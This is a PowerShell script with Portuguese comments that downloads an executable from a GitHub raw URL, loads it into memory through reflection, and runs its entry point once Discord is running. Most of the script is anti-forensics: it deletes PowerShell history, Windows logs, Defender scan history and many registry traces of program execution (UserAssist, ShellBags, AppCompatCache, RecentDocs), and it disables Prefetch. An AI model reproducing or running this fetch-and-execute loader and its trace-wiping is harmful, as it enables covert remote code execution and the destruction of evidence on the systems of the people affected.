$link = "https://github.com/zold1337/toolsvip/raw/refs/heads/main/IME2.exe"
$webClient = New-Object System.Net.WebClient
$bytes = $webClient.DownloadData($link)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entry = $assembly.EntryPoint

# --- CORREÇÃO 1: Clear-RecycleBin com ErrorAction ---
Clear-RecycleBin -Force -Confirm:$false -ErrorAction SilentlyContinue

Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "UpdateExeVolatile" -Force -ErrorAction SilentlyContinue
Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Clear-History -ErrorAction SilentlyContinue

# --- COMANDOS EXTERNOS (se der erro, remova ou use PowerShell puro) ---
REG ADD e fsutil são comandos externos (cmd). Se não estiverem funcionando, remova.
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d 0 /f
fsutil behavior set disablelastaccess 1

# --- Se quiser fazer via PowerShell puro (sem cmd): ---
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue

# fsutil não tem equivalente PowerShell direto, mas você pode usar:
# (não recomendado mexer nisso, pode causar lentidão)

$timeout = (Get-Date).AddSeconds(60)

while ((Get-Date) -lt $timeout) {
    if (Get-Process Discord -ErrorAction SilentlyContinue) {
        break
    }
    Start-Sleep -Seconds 1
}

if (-not (Get-Process Discord -ErrorAction SilentlyContinue)) {
    $discordPath = "$env:LOCALAPPDATA\Discord\Update.exe"
    if (Test-Path $discordPath) {
        Start-Process $discordPath -ArgumentList "--processStart Discord.exe"
    }
    else {
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.MessageBox]::Show("Not Found","Error",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Error)
        Exit
    }
}

# --- CORREÇÃO 2: Invoke com array correto ---
$invokeArgs = New-Object object[] 1 
$invokeArgs[0] = [string[]]@() 
$entry.Invoke($null, [object[]]@())

# --- LIMPEZA (sem erros) ---
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\CBS\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\CrashDumps\*.dmp"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\MoSetup\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Panther\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\inf\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\System32\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\SoftwareDistribution\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Microsoft.NET\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Windows\WebCache\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Windows\SettingSync\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\ThumbCacheToDelete\*.tmp"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Terminal Server Client\Cache\*.bin"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Windows\INetCache\*"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\ProgramData\Microsoft\Windows\WER\ReportArchive\*"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\*"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Windows\History\*"

# --- REGISTRO ---
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\UFH\SHC" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.dll\OpenWithList" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\WinRAR\ArcHistory" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\WinRAR\DialogEditHistory\ExtrPath" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\Shell\Bags" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\Shell\BagMRU" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Persisted" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKLM:\SYSTEM\ControlSet001\Control\Session Manager\AppCompatCache" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppLaunch" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count" -Recurse -Force -ErrorAction SilentlyContinue

# --- HISTÓRICO ---
Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Clear-History -ErrorAction SilentlyContinue
Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Clear-History -ErrorAction SilentlyContinue
